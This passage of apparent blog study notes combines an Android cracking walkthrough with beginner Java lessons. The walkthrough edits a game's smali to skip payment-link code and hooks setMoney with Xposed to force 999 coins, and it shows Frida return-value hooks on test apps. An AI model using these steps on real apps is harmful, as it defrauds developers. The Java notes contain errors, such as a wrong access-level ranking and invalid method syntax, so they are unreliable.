%}\n\n# 13. Xpose实战2\n\n目标：hook修改极品美女找茬游戏中的金币余额为999。\n\n运行apk，每次评论或分享都可以获得50金币。\n\n{% asset_img 13.1.png 找茬求助界面 %}\n\nAK查看apk，manifest标签的包名为com.jimmy.beauty.pick，application标签添加android_debugable=\"true\"。\n\njeb中在smali代码中搜索“金币”，发现它在SOSActivity中。\n\n{% asset_img 13.2.png 100金币 %}\n\n进入SOSActivity反编译成Java代码，在某个case中发现CommentActivity。\n\n{% asset_img 13.3.png SOSActivity %}\n\n继续进去CommentActivity看看。有个按钮事件，一个是“现在去给”评价，另一个是“以后再说”。修改的思路是将giveComment方法放到“以后再说”，再将giveComment方法里的前3行都去掉，因为那几行代码是构造支付链接。这些都是在AK中修改smali代码完成的。\n\n{% asset_img 13.4.png giveComment %}\n\n进去setMoney方法，一个参数为Context类型，一个参数为int类型。\n\n{% asset_img 13.5.png setMoney %}\n\n此时可以hook这个setMoney方法了。\n\n{% asset_img 13.6.png hook代码 %}\n\n连上模拟器，安装app，Xposed Installer勾选相应程序模块，重启模拟器。运行程序，开一局游戏，求助 -> 评论 -> 以后再说，就可以获得999金币！\n\n{% asset_img 13.7.png hook代码 %}\n\n# 14. adb注意事项\n\n每次打开AS模拟器都会弹出如下图所示的错误：\n\n{% asset_img 14.1.png 错误 %}\n\n是因为5037端口被占用了。在cmd输入` netstat -ano|findstr \"5037\"`查看被哪个进程占用。\n\n```\nC:\\Users\\dell>netstat -ano|findstr \"5037\"\n  TCP    [::1]:3425             [::1]:5037             SYN_SENT        18760\n```\n\n输入`taskkill -f -pid 18760`杀死相应的进程。\n\n# 15. Native层hook\n\n本来想安装Cydia Substrate的，结果这个软件很久没更新了，最高只支持安卓系统4.3的，模拟器和近几年的真机都安装不了，所以换了另一个框架Frida。\n\n[Frida超详细安装实战教程](https://www.52pojie.cn/thread-1128884-1-1.html)\n\n## 15.1 Frida hook java\n\n```python\nimport frida  #导入frida模块\nimport sys    #导入sys模块\n\njscode = \"\"\"  #从此处开始定义用来Hook的javascript代码\n    Java.perform(function(){  \n        var MainActivity = Java.use('com.example.testfrida.MainActivity'); //获得MainActivity类\n        MainActivity.testFrida.implementation = function(){ //Hook testFrida函数，用js自己实现\n            send('Statr! Hook!'); //发送信息，用于回调python中的函数\n            return 'Change String!' //劫持返回值，修改为我们想要返回的字符串\n        }\n    });\n\"\"\"\n\ndef on_message(message,data): #js中执行send函数后要回调的函数\n    print(message)\n\nprocess = frida.get_remote_device().attach('com.example.testfrida') #得到设备并劫持进程com.example.testfrida（该开始用get_usb_device函数用来获取设备，但是一直报错找不到设备，改用get_remote_device函数即可解决这个问题）\nscript = process.create_script(jscode) #创建js脚本\nscript.on('message',on_message) #加载回调函数，也就是js中执行send函数规定要执行的python函数\nscript.load() #加载脚本\nsys.stdin.read()\n```\n\n## 15.2 Frida hook 返回值为int类型\n\n```python\nimport frida\nimport sys\n\njscode = \"\"\"\nJava.perform(function(){\n    //下面这一句代码是指定要Hook的so文件名和要Hook的函数名，函数名就是上面IDA导出表中显示的那个函数名\n    Interceptor.attach(Module.findExportByName(\"libfridaso.so\",\"Java_com_example_fridaso_FridaSoDefine_FridaSo\"),{\n        //onEnter: function(args)顾名思义就是进入该函数前要执行的代码，其中args是传入的参数，一般so层函数第一个参数都是JniEnv，第二个参数是jclass，从第三个参数开始才是我们java层传入的参数\n        onEnter: function(args) {\n            send(\"Hook start\");\n            send(\"args[2]=\" + args[2]); //打印我们java层第一个传入的参数\n            send(\"args[3]=\" + args[3]); //打印我们java层传入的第二个参数\n        },\n        onLeave: function(retval){ //onLeave: function(retval)是该函数执行结束要执行的代码，其中retval参数即是返回值\n            send(\"return:\"+retval); //打印返回值\n            retval.replace(0); //替换返回值为0\n        }\n    });\n});\n\"\"\"\ndef printMessage(message,data):\n    if message['type'] == 'send':\n        print('{0}'.format(message['payload']))\n    else:\n        print(message)\n\nprocess = frida.get_remote_device().attach('com.example.fridaso')\nscript = process.create_script(jscode)\nscript.on('message',printMessage)\nscript.load()\nsys.stdin.read()\n```\n\n## 15.3 Frida hook 返回值为String类型\n\n```python\nimport frida\nimport sys\n\njscode = \"\"\"\nJava.perform(function(){\n    Interceptor.attach(Module.findExportByName(\"libfridaso.so\",\"Java_com_example_fridasostring_fridaSoString_FridaSo\"),{\n        onEnter: function(args) {\n            send(\"Hook start\");\n            send(\"args[2]=\" + args[2]);\n        },\n        onLeave: function(retval){\n            send(\"return:\"+retval);\n            var env = Java.vm.getEnv(); //获取env对象，也就是native函数的第一个参数\n            var jstrings = env.newStringUtf(\"tamper\"); //因为返回的是字符串指针，使用我们需要构造一个newStringUtf对象，用来代替这个指针\n            retval.replace(jstrings); //替换返回值\n        }\n    });\n});\n\"\"\"\ndef printMessage(message,data):\n    if message['type'] == 'send':\n        print('{0}'.format(message['payload']))\n    else:\n        print(message)\n\nprocess = frida.get_remote_device().attach('com.example.fridasostring')\nscript = process.create_script(jscode)\nscript.on('message',printMessage)\nscript.load()\nsys.stdin.read()\n```\n\n## 15.4. Native hook实战\n\n[攻防世界 ill-intentions](https://v5le0n9.github.io/posts/9f62af2.html#20-ill-intentions)\n\n","categories":["Android逆向"],"tags":["Java","IDA","Android Killer","吾爱破解培训"]},{"title":"Java学习","url":"/posts/8df0ec14.html","content":"\n# 类和对象\n\n类相当于C语言的结构体，但结构体内不能有函数，而类可以。类是一个模型，而对象是类实现的具体事物。\n\n<!--more-->\n\n```java\n/** TestTriangle.java\n算三角形的周长与面积\n*/\nclass Triangle\n{//这是一个类\n    int a,b,c;\n    int zhouchang()\n        return a + b + c;\n    double area()\n    {\n        double p = 1.0 * (a + b + c) / 2;\n        return Math.sqrt(p * (p-a) * (p-b) * (p-c));\n    }\n}\n\nclass TestTriangle\n{\n    public static void main(String[] args)\n    {\n        Triangle t = new Triangle();//由类new出一个对象\n        t.a = 3;\n        t.b = 4;\n        t.c = 5;\n        System.out.printf(\"%d %f\\n\",t.zhouchang(),t.area());\n    }\n}\n/** 在命令行输入\njavac TestTriagle.java\njava TestTriangle\n*/\n```\n\n# 内存分配\n\n```java\n/** TestDemo.java*/\nclass A\n{\n    int i;\n    int j;\n}\n\nclass TestDemo\n{\n    public static void main(String[] args)\n    {\n        A aa = new A();\n        \t\t//new A();相当于(A *)malloc(sizeof(A));\n        \t\t//new A();在堆中动态分配一块区域，被当作A对象\n        \t\t//aa本身是在栈中分配的\n        \t\t//堆中内存地址赋给了aa，aa指向堆中的内存，aa代表了堆中的内存\n        \t\t//aa.i代表aa这个静态指针所指向的动态内存中的A对象的i成员\n        aa.i = 10;\n        aa.j = 20;\n        System.out.printf(\"%d,%d\\n\",aa.i,aa.j);\n    }\n}\n```\n\n# 访问控制符\n\n将类和对象的例子修改一下，在Triangle中添加一个方法访问a,b,c，使得main函数通过这个方法间接访问a,b,c，这个方法相当于一个按钮，一个接口，一个黑匣子，不能让程序员或用户知道里面的具体实现，保证安全。\n\n```java\n/** TestTriangle_2.java\n算三角形的周长与面积\n*/\nclass Triangle\n{\n    private int a,b,c;//私有表示只能在Triangle类里面访问\n    void set(int i, int j, int k)\n    {//方法\n        a = i;\n        b = j;\n        c = k;\n    }\n    int zhouchang()\n        return a + b + c;\n    double area()\n    {\n        double p = 1.0 * (a + b + c) / 2;\n        return Math.sqrt(p * (p-a) * (p-b) * (p-c));\n    }\n}\n\nclass TestTriangle_2\n{\n    public static void main(String[] args)\n    {\n        Triangle t = new Triangle();\n        t.set(3, 4, 5);\n        System.out.printf(\"%d %f\\n\",t.zhouchang(),t.area());\n    }\n}\n/** 在命令行输入\njavac TestTriagle_2.java\njava TestTriangle_2\n*/\n```\n\n类的访问控制符\n\n| 访问控制符    | 意义                                          |\n| ------------- | --------------------------------------------- |\n| public        | 可以通过外部访问方式访问类内部的public成员    |\n| private       | 不可以通过外部访问方式访问类内部的private成员 |\n| protected     |                                               |\n| default(默认) |                                               |\n\n权限高低：protected < public < private\n\n```java\nclass A\n{\n    private int i;\n    public int j;\n    protected int m;\n    \n    private void f()\n    {\n        i = 1;\n        j = 2;\n        m = 3;\n        k();\n        g();\n    }\n    protected void k()\n    {\n        i = 1;\n        j = 2;\n        m = 3;\n        f();\n        g();\n    }\n    public void g()\n    {\n        i = 1;\n        j = 2;\n        m = 3;\n        f();\n        k();\n    }\n}\nclass TestAccess\n{\n    public static void main(String[] args)\n    {\n        A aa = new A();\n        //aa.i = 10;//不可行，因为i是私有的\n        aa.j = 20;//可以，因为j是公有的\n        aa.m = 22;//可以，因为m是保护型的\n    }\n}\n```\n\n不同访问控制符\n\n|                      | public | protected | default | private |\n| -------------------- | ------ | --------- | ------- | ------- |\n| 同包同类             | √      | √         | √       | √       |\n| 同包不同类           | √      | √         | √       |         |\n| 同包不同类继承       | √      | √         | √       |         |\n| 不同包继承           | √      | √         |         |         |\n| 不同包无任何关系的类 | √      |           |         |         |\n\n包相当于文件夹，类相当于文件。\n\n# 构造函数\n\n构造函数要跟类名一样，构造函数没有返回值。\n\n```java\nclass A\n{\n    private int i;\n    private int j;\n    \n    //构造函数\n    public A(int a, int b)\n    {\n        i = a;\n        j = b;\n        System.out.printf(\"有参构造函数被调用了！\\n\");\n    }\n    //构造函数\n    public A()\n    {\n        System.out.printf(\"无参构造函数被调用了！\\n\");\n    }\n    //方法\n    public void show()\n    {\n        System.out.printf(\"i = %d, j = %d\\n\",i ,j);\n    }\n}\n\nclass TestConst\n{\n    public static void main(String[] args)\n    {\n        A aa = new A(1, 2);//在定义时赋值，相当于int i = 0;\n        aa.show();\n        A ab = new A();\n        ab.show();//正确，默认i=0,j=0,因为i和j不在函数内部，不是局部变量，而是类的属性\n        \t\t\t//boolean类型默认为flase，用%b输出\n        int k;\n        System.out.printf(\"%d\\n\", k);//错误，k是局部变量，未初始化，在java里面局部变量在使用前需初始化，否则报错\n    }\n}\n```\n\n# 函数的重载\n\n同名的函数通过不同的形参做类似的事情。\n\n函数重载要求：\n\n1. 函数的形参个数\n2. 函数的形参顺序\n3. 函数的形参数据类型\n\n这三个至少有一个是不一样的。\n\n```java\nclass Testadd\n{\n    static int add(int a, int b)\n    {\n        return a + b;\n    }\n    \n    static int add(int a, int b, int c)\n    {\n        return a + b + c;\n    }\n    \n    static double add(double a, double b)\n    {\n        return a + b;\n    }\n    \n    public static void main(String args[])\n    {\n        System.out.printf(\"%d\\n\",add(1,2));\n        System.out.printf(\"%d\\n\",add(1,2,3));\n        System.out.printf(\"%f\\n\",add(1.2,2.4));\n    }\n}\n```\n\n# 关键字\n\n## this指针\n\n```java\nclass A\n{\n    public int i;\n    public A(int j)\n    {\n        i = j; \n    }\n    public void show(/* A * this*/)//①this代表当前正在调用show方法的对象\n    {\n        System.out.printf(\"i = %d\\n\",/*(*this).*/i);\n    }\n}\n\npublic class TestThis\n{\n    public static void main(String[] args)\n    {\n        A aa1 = new A(10);\n        A aa2 = new A(20);\n        aa1.show();//aa1.show(aa1);\n        aa2.show();//aa2.show(aa2);\n    }\n}\n```\n\naa1和aa2在内存中分别由各自的数据成员i，但是aa1和aa2公用show()方法，show方法如何知道输出的i应该是哪个对象中的i？实际上每个非static方法中都隐含着一个this指针，指向当前正在调用该方法的对象。\n\n```java\nclass A\n{\n    public int i = 99;\n    public A(int i)\n    {\n        System.out.printf(\"%d\\n\", i);//输出2\n    }\n}\npublic class TestThis_2\n{\n    public static void main(String[] args)\n    {\n        A aa = new A(2);\n        System.out.printf(\"%d\\n\", aa.i);//输出99\n    }\n}\n```\n\n```java\nclass A\n{\n    public int i = 99;\n    public A(int i)\n    {\n   \t \tthis.i = i;//②this代表当前时刻正在创建的对象，即this.i是属性，i是局部变量\n        System.out.printf(\"%d\\n\", i);//输出2\n    }\n}\npublic class TestThis_2\n{\n    public static void main(String[] args)\n    {\n        A aa = new A(2);\n        System.out.printf(\"%d\\n\", aa.i);//输出2\n    }\n} \n```\n\n## static\n\n```java\nclass A \n{\n    public static int i = 10;//①在属性前加static，意味着所有对象都共用一个属性\n    public void show()\n    {\n        System.out.printf(\"%d\\n\",i);\n    }\n}\nclass M\n{\n    public static void main(String[] args)\n    {\n        A aa1 = new A();\n        A aa2 = new A();\n        aa1.i = 20;\n        aa2.show();//输出20，意味着aa1.i与aa2.i是同一个        \n    }\n}\n```\n\n```java\nclass A \n{\n    public static int i = 10;//②在属性前加static，没有对象也仍然可以通过类名的方式访问内部的static属性\n    public static void f()\n    {//方法也可以访问\n        System.out.printf(\"2022年1月20日\\n\");\n    }\n}\nclass M\n{\n    public static void main(String[] args)\n    {\n        System.out.printf(\"%d\\n\",A.i);//输出10\n        A.f();//输出日期\n        A aa = new A();\n        aa.f();//输出日期\n        System.out.printf(\"%d\\n\",aa.i);//输出10\n    }\n}\n```\n\n```java\nclass A \n{\n    public static int i = 10;\n    private static void f()//③static可以通过类名访问，但是在非private的情况下才可以访问\n    {\n        System.out.printf(\"2022年1月20日\\n\");\n    }\n}\nclass M\n{\n    public static void main(String[] args)\n    {\n        System.out.printf(\"%d\\n\",A.i);//输出10\n        A.f();//错误\n    }\n}\n```\n\n```java\nclass A \n{\n    public static int i = 10;\n    public static void f()\n    {\n        //g();//④静态方法不能访问非静态成员\n        System.out.printf(\"2022年1月20日\\n\");\n    }\n    public void g()\n    {\n        f();//非静态方法可以访问静态成员\n        System.out.printf(\"GGGG\\n\");\n    }\n}\n```\n\n用static求出由某个类造出几个对象：\n\n```java\nclass A\n{\n    private int i;\n    private static int cnt = 0;\n    public A()\n    {\n        ++cnt;\n    }\n    public A(int i)\n    {\n        this.i = i;\n        ++cnt;\n    }\n    public static int getCnt()\n    {\n        return cnt;//返回的是A对象的个数,静态属性不能加this，所以不能写this.cnt\n    }\n}\n\npublic class TestStatic\n{\n    public static void main(String[] args)\n    {\n        System.out.printf(\"%d\\n\",A.getCnt());//输出0\n        A aa1 = new A();\n        System.out.printf(\"%d\\n\",A.getCnt());//输出1\n        A aa2 = new A(2);\n        System.out.printf(\"%d\\n\",A.getCnt());//输出2\n    }\n}\n```\n\n某类只能造一个对象：\n\n```java\nclass A\n{\n    public int i = 20;\n    private static A aa = new A();//aa是A类的属性也是A类造出的对象\n    private A()\n    {//将构造函数私有，使得外部不能new出一个对象\n       \n    }\n    public static A getA()\n    {//通过这个方法只能调用A类里面构造的对象\n        return aa;\n    }\n}\n\npublic class TestStatic_2\n{\n    public static void main(String[] args)\n    {\n        //A aa1 = new A();//错误\n        A aa1 = A.getA();\n        A aa2 = A.getA();\n        aa1.i = 99;\n        System.out.printf(\"%d\\n\",aa2.i);//输出99，也就是说aa1和aa2是同一个\n    }\n}\n```\n\n一个类的属性可以是个类对象：\n\n```java\nclass A\n{\n\tpublic void f()\n    {\n        System.out.printf(\"哈哈\\n\");\n    }\n}\nclass C\n{\n\tpublic int i;\n\tpublic A aa = new A();//aa一定是个对象，aa也是C类的属性\n    public void g()\n    {//g()方法可以访问aa\n        aa.f();\n    }\n}\nclass M\n{\n\tpublic static void main(String[] args)\n    {\n        C cc = new C();\n        cc.g();\n    }\n}\n```\n\n# 继承\n\n```java\nclass human\n{\n    public String name;\n    public int age;\n}\nclass student\n{\n    public String name;\n    public int age;\n    public double score;\n}\nclass graduate\n{\n    public String name;\n    public int age;\n    public double score;\n    public String tutor;\n}\n```\n\n这样写很累赘，因为人包括学生，学生包括研究生，所以利用继承是一个很好的方法。\n\n```java\nclass human\n{\n    public String name = \"张三\";\n    public int age = 22;\n}\nclass student extends human\n{\n    public double score = 99.9;\n}\nclass graduate extends student\n{\n    public String tutor = \"李四\";\n}\npublic class TestExtends\n{\n    public static void main(String[] args)\n    {\n        graduate gd = new graduate();\n        System.out.printf(\"%s %f\\n\",gd.name, gd.score);//输出正确\n    }\n}\n```\n\n```java\nclass A\n{\n    public int i;\n    protected int j;\n    private int k;\n    public void g()\n    {}\n    private void s()\n    {}\n    protected void b()\n    {}\n}\nclass B extends A\n{\n    public void f()\n    {\n        i = 10;\n        j = 20;\n        //k = 30;//错误，私有属性不能被继承\n        g();\n        //s();//错误，私有方法不能被继承\n        b();\n    }\n    private void m()\n    {\n        i = 10;\n        j = 20;\n        //k = 30;//错误，私有属性不能被继承\n        g();\n        //s();//错误，私有方法不能被继承\n        b();\n    }\n}\nclass M\n{\n    public static void main(String[] args)\n    {\n        B bb = new B();\n        bb.i = 20;\n        bb.j = 30;\n        bb.b();\n        bb.g();\n        //bb.s();//错误\n        //bb.k();//错误，通过子类对象名只能访问从父类继承过来的非private成员\n      //私有不能被继承，私有从物理上会被继承，但是程序员不能访问，因此继承要慎重，否则会浪费内存\n    }\n}\n```\n\n```java\nclass A\n{\n    public static int i = 20;\n    protected int j;\n    private int k;\n}\nclass B extends A\n{\n    private void g()\n    {\n        \n    }\n}\nclass M\n{\n    public static void main(String[] args)\n    {\n        B.i = 99;\n        System.out.printf(\"%d\\n\",B.i);//输出99，说明可以A.i，也可以通过继承实现B.i\n    }\n}\n```\n\n子类访问父类成员的三种方式：\n\n1. 在子类内部访问父类成员\n2. 通过子类对象名访问父类成员\n3. 通过子类的类名访问父类成员\n\n Java只支持单继承，不允许多继承。单继承就是一个类只能有一个父类。\n\n子类可以继承父类所有成员变量和成员方法，但子类永远也无法继承父类的构造函数。在子类的构造方法中可使用语句super(参数列表)调用父类的构造方法。\n\n```java\nclass A\n{\n    public int i;\n    public int j;\n    public A()\n    {\n        \n    }\n    public A(int i, int j)\n    {\n        this.i = i;\n        this.j = j;\n    }\n}\nclass B extends A\n{\n    public int k;\n    public B()\n    {\n        \n    }\n    public B(int i, int j, int k)\n    {//只写int k不对，因为B类包括A类的属性，所以一共三个\n        this.i = i;//i,j可以用this，因为B类继承了A类的属性\n        this.j = j;//即A类属性已经包含在B类中\n        //如果A类有100个属性，不可能一直这么写，要用super\n        this.k = k;\n    }\n}\npublic class TestSuper\n{\n    public static void main(String[] args)\n    {\n        B bb = new B(1,2,3); \n    }\n}\n```\n\n```java\nclass A\n{\n    public int i;\n    public int j;\n    public A()\n    {\n        \n    }\n    public A(int i, int j)\n    {\n        this.i = i;\n        this.j = j;\n    }\n}\nclass B extends A\n{\n    public int k;\n    public B()\n    {\n        \n    }\n    public B(int i, int j, int k)\n    {//只写int k不对，因为B类包括A类的属性，所以一共三个\n        //A(i, j);//错误，父类构造函数无法继承\n        super(i, j);//正确\n        this.k = k;\n        //super(i, j);//错误，super要放在构造函数的第一个语句\n    }\n}\npublic class TestSuper\n{\n    public static void main(String[] args)\n    {\n        B bb = new B(1,2,3); \n        System.out.printf(\"%d,%d\\n\",bb.i,bb.j);\n    }\n}\n```\n\n```java\nclass A\n{\n    public int i;\n}\nclass B\n{\n    public int j;\n    public B(int i, int j)\n    {\n        //super();③如果只写this.j = j就默认调用super();\n        //super(i);//②错误，A类没有只有一个参数的构造函数\n        //④不能同时调用两个构造函数\n        this.j = j;\n    }\n    public void f(int i)\n    {\n        //super(i);//①错误，方法不能调用父类的构造函数\n    }\n}\npublic class TestSuper_2\n{\n    public static void main(String[] args)\n    {\n        \n    }\n}\n```\n\n# 重写父类的方法\n\n```java\nclass A\n{\n    public void f()\n    {\n        System.out.printf(\"AAAA\\n\");\n    }\n}\nclass B extends A\n{\n    public void f()\n    {\n        //f();//死递归\n        super.f();//调用从父类继承过来的f方法\n        System.out.printf(\"BBBB\\n\");\n    }\n}\npublic class TestOver\n{\n    public static void main(String[] args)\n    {\n        B bb = new B();\n        bb.f();//输出AAAA\\nBBBB\\n\n    }\n}\n```\n\n```java\nclass A\n{\n    public void f()\n    {\n        System.out.printf(\"AAAA\\n\");\n    }\n    public void f(int i)\n    {\n        System.out.printf(\"hhhh\\n\");\n    }\n}\nclass B extends A\n{\n    public void f()\n    {\n        super.f();//调用从父类继承过来的f方法\n        f(10);//正确，因为B类没有f(int i)所以去A类找，也可以写成super.f(10);\n        System.out.printf(\"BBBB\\n\");\n    }\n}\npublic class TestOver\n{\n    public static void main(String[] args)\n    {\n        B bb = new B();\n        bb.f();//输出AAAA\\nhhhh\\nBBBB\\n\n    }\n}\n```\n\n```java\nclass A\n{\n    public void f()\n    {\n        System.out.printf(\"AAAA\\n\");\n    } \n}\nclass B extends A\n{\n    private void f()\n    {//重写只能权限相等或更高\n        System.out.printf(\"BBBB\\n\");\n    }\n}\npublic class TestOver\n{\n    public static void main(String[] args)\n    {\n        B bb = new B();\n        bb.f();\n    }\n}\n```\n\n方法重写指在子类中重新定义父类中已有的方法。重写方法必须和被重写方法具有相同的方法名称、参数列表和返回值类型。\n\n```java\nclass human\n{\n    private String name;\n    private int age;\n    public human()\n    {\n        \n    }\n    public human(String name, int age)\n    {\n        this.name = name;\n        this.age = age;\n    }\n    public void setName(String name)\n    {\n        this.name = name;\n    }\n    public void setAge(int age)\n    {\n        this.age = age;\n    }\n    public String getInfor()\n    {\n        String strInf = name + \": \" +age;\n        return strInf;\n    }\n}\nclass student extends human\n{\n    public String school;\n    public student()\n    {}\n    public student(String name, int age, String school)\n    {\n        super(name, age);\n        this.school = school;\n    }\n    public void setschool(String school)\n    {\n        this.school = school;\n    }\n    public String getInfor()\n    {\n        //String strInf = name + \": \" + age + \": \" + school;//因为name和age都是私有的，所以在student类不能这么写\n        String strInf = super.getInfor() + \": \" + school;\n        return strInf;\n    }\n}\npublic class TestStudent\n{\n    public static void main(String[] args)\n    {\n        student st1 = new student(\"张三\", 22, \"星星大学\");\n        System.out.printf(\"%s\\n\", st1.getInfor());\n    }\n}\n```\n\n# 多态\n\n```java\nclass A\n{\n    protected void f()\n    {\n        System.out.printf(\"AAAA\\n\");\n    }\n}\nclass B extends A\n{\n    public void f()\n    {//重写方法的权限不能低于被重写方法的访问权限，是因为多态的存在\n        System.out.printf(\"BBBB\\n\");\n    }\n}\npublic class TestPoly_2\n{\n    public static void main(String[] args)\n    {\n        A aa = new A();\n        B bb = new B();\n        aa.f();//输出AAAA\\n\n        aa = bb;//把bb当作aa来看待(把特殊当作一般看待)\n        //bb = aa;//错误\n        aa.f();//输出BBBB\\n\n        //同一条代码做不同的事情，这就是多态\n    }\n}\n```\n\n```java\nclass A\n{\n    public void f()\n    {\n        System.out.printf(\"AAAA\\n\");\n    }\n}\nclass B extends A\n{\n    public void f()\n    {\n        System.out.printf(\"BBBB\\n\");\n    }\n}\nclass C extends B\n{\n    public void f()\n    {\n        System.out.printf(\"CCCC\\n\");\n    }\n}\nclass D extends C\n{\n    public void f()\n    {\n        System.out.printf(\"DDDD\\n\");\n    }\n}\npublic class TestPoly_3\n{\n    public static void g(A aa)\n    {\n        aa.f();\n    }\n    public static void main(String[] args)\n    {\n        A aa = new A();\n        B bb = new B();\n        C cc = new C();\n        D dd = new D();\n        g(aa);\n        g(bb);\n        g(cc);\n        g(dd);\n    }\n}\n```\n\n```java\nclass A\n{\n    public void f()\n    {\n        System.out.printf(\"AAAA\\n\");\n    }\n}\nclass B extends A\n{\n    public void f()\n    {\n        System.out.printf(\"BBBB\\n\");\n    }\n    public void g()\n    {\n    \tSystem.out.printf(\"GGGG\\n\");\n    }\n}\npublic class TestPoly_4\n{\n    public static void main(String[] args)\n    {\n        A aa = new A();\n        B bb = new B();\n        //bb = aa;//如何实现？只有在父类引用本身指向的就是一个子类对象时，才可以把父类引用强制转化为子类引用\n        aa = bb;\n        bb = (B)aa;\n        bb.g();//输出GGGG\\n\n    }\n}\n```\n\n```java\nclass A\n{\n    public void f()\n    {\n        System.out.printf(\"AAAA\\n\");\n    }\n}\nclass B extends A\n{\n    public void f()\n    {\n        System.out.printf(\"BBBB\\n\");\n    }\n    public void g()\n    {\n        System.out.printf(\"GGGG\\n\");\n    }\n}\npublic class TestPoly_4\n{\n    public static void main(String[] args)\n    {\n        A aa = new A();\n        B bb = new B();\n        aa = bb;\n        //aa.g();//错误，只能调用A类和B类的共有部分\n    }\n}\n```\n\n子类对象可以直接赋给父类引用，但父类对象在任何情况下都不可以直接赋给子类使用。通过父类引用只能访问子类对象从父类继承过来的成员，不能访问子类对象所特有的成员。\n\n# 抽象类\n\n抽象类通常用来作为一个类族的最顶层的父类，用最底层的类表示现实中的具体事物，用最顶层的类表示该类族所有事物的共性。\n\n```java\nabstract class A\n{//有抽象方法一定是抽象类\n    abstract public void f();//没有方法体的方法叫做抽象方法，抽象方法要求末尾必须得加分号，前面必须得加abstract\n}\nabstract class B\n{//抽象类不一定要有抽象方法\n    public void g()\n    {}\n}\npublic class TestAbstract\n{\n    public static void main(String[] args)\n    {}\n}\n```\n\n```java\nclass A\n{\n    \n}\nabstract class B extends A\n{//抽象类可以继承非抽象类\n    \n}\npublic class TestAbsPoly\n{\n    public static void main(String[] args)\n    {}\n}\n```\n\n```java\nabstract class A\n{\n    abstract public void f();\n}\nclass B extends A\n{//B类是非抽象类，所以要实现f方法，即要具体写f方法\n    public void f()\n    {\n        System.out.printf(\"BBBB\\n\");\n    }\n}\nabstract class C extends A\n{//C类是抽象类，所以可以不具体实现f方法\n    \n}\npublic class TestAbsPoly\n{\n    public static void main(String[] args)\n    {\n        //A aa = new A();//错误，抽象类不能创建对象\n        B bb = new B();\n        bb.f();//输出BBBB\\n        \n        A aa;//可以定义一个抽象类的引用，但不可以定义一个抽象类的对象\n        aa = bb;//OK\n        aa.f();//输出BBBB\\n，利用多态调用子类的具体实现方法\n    }\n}\n```\n\n# Final\n\nFinal可以修饰\n\n1. 整个类\n2. 类中的若干个属性\n3. 类中的若干个方法：表示该方法可以被子类继承，但不可以被子类重写\n\n```java\n//final class A\nclass A\n{//如果A类是最终的，则不能被继承\n    \n}\nclass B extends A\n{\n    \n}\npublic class TestFinal\n{\n    public static void main(String[] args)\n    {\n        \n    }\n}\n```\n\n```java\nclass A\n{\n    //final public int i;//常变量，变量必须赋一个固定值，以后不能再改变，相当于C语言的const\n    final public int i = 10;\n}\npublic class TestFinal\n{\n    public static void main(String[] args)\n    {\n        \n    }\n}\n```\n\n```java\nclass A\n{\n    final public int i;\n    public A()\n    {//②创建对象一定调用构造函数，所以在构造函数里写正确\n        i = 22;\n    }\n    public void f()\n    {//①f方法可能不被调用，i也就没有赋值\n        //i = 22;//错误\n    }\n}\npublic class TestFinal\n{\n    public static void main(String[] args)\n    {\n        \n    }\n}\n```\n\n# 接口\n\n接口就是抽象方法和常量值的集合。从本质上讲，接口是一种特殊的抽象类。\n\n```java\ninterface It\n{\n    public void f();\n    //public void f()\n    //{}//错误，接口不能有实现方法\n}\nabstract class B\n{\n    public void f()\n    {//抽象类可以有实现方法\n        \n    }\n}\npublic class A\n{\n    public static void main(String[] args)\n    {\n        \n    }\n}\n```\n\n## 接口的注意事项\n\n1. 接口中定义的属性必须是`public static final`的，而接口中定义的方法则必须是`public abstract`的，因此这些修饰符可以部分或全部省略。\n\n   ```java\n   interface It\n   {\n       public static final int i = 20;\n       //可以写成int i = 20;\n       public abstract void f();\n       //可以写成void f();\n   }\n   public class A\n   {\n       public static void main(String[] args)\n       {\n           \n       }\n   }\n   ```\n\n2. 接口中定义的属性的值在实现类中不能被更改。\n\n   ```java\n   interface It\n   {\n       int i = 10;//不能为int i;\n   }\n   class A implements It\n   {\n       public A(int j)\n       {\n           //this.i = j;//错误，接口中的属性值不能被修改\n       }\n   }\n   public class B\n   {\n       public static void main(String[] args)\n       {}\n   }\n   ```\n\n3. 一个类只能实现(`implements`)某个接口，不能继承(`extends`)某个接口。\n\n   ```java\n   interface It\n   {\n       public static final int i = 20;\n       public abstract void f();\n   }\n   abstract class A implements It \n   {//如果接口中有抽象方法且A类没有实现接口的全部方法，A必须为抽象类\n       \n   }\n   class C implements It\n   {//如果没有抽象方法或C类实现接口的全部方法，则可以是非抽象类\n       public void f()\n       {\n           System.out.printf(\"i = %d\\n\", i);\n       }\n   }\n   public class B\n   {\n       public static void main(String[] args)\n       {\n           C cc = new C();\n           cc.f();//输出i = 20\n       }\n   }\n   ```\n\n4. 接口可以继承接口。 \n\n   ```java\n   interface It1\n   {\n       \n   }\n   interface It2\n   {\n       \n   }\n   interface It3 extends It1, It2\n   {\n       \n   }\n   public class C\n   {\n       public static void main(String[] args)\n       {\n           \n       }\n   }\n   ```\n\n5. 接口允许多继承。(看4)\n\n6. 如果一个类只实现了一个接口的部分方法，则该类必须得声明为抽象类。(看3)\n\n7. 一个类可以在继承一个父类的同时实现一个或多个接口，但`extends`关键字必须得在`implements`之前。\n\n   ```java\n   class A\n   {}\n   interface It1\n   {}\n   interface It2\n   {}\n   interface It3 extends It1, It2\n   {}\n   interface It4\n   {\n       int i = 20;\n   }\n   class T extends A implements It4, It3\n   {}\n   public class TestIter\n   {\n       public static void main(String[] args)\n       {}\n   }\n   ```\n\n8. 不可以`new`接口对象，但可以定义一个接口引用类型的变量并将其指向实现接口的对象，达到多态的目的。\n\n   ```java\n   interface It\n   {\n       void f();\n   }\n   class A implements It\n   {\n       public void f()\n       {\n           System.out.printf(\"AAAA\\n\");\n       }\n       public void g()\n       {}\n   }\n   class D\n   {\n       publc static void main(String[] args)\n       {\n           It it;\n           it = new A();\n           it.f();//输出AAAA\\n\n           //it.g();//错误，不能调用子类特有成员\n           //It it2 = new It();//不可以创建接口对象\n       }\n   }\n   ```\n\n## 接口的作用\n\n1. 通过接口可以实现不相关类的相同行为\n2. 接口提供了不同对象进行协作的平台\n3. 接口可以实现多继承，从一个程度上弥补了类只能单继承的缺陷\n4. 接口是我们了解一个类功能的重要途径\n\n# 包\n\n```java\n/** package.java*/\npackage zhangsan.lisi;\n//package语句必须是第一条语句，注释不算\n//把下面的类放在了zhangsan文件夹的子文件夹lisi里面\nclass A\n{\n    public void f()\n    {\n        System.out.printf(\"AAAA\\n\");\n    }\n}\nclass M\n{\n    public static void main(String[] args)\n    {\n        A aa = new A();\n        aa.f();\n        //上面等同于下面\n        new A().f();\n    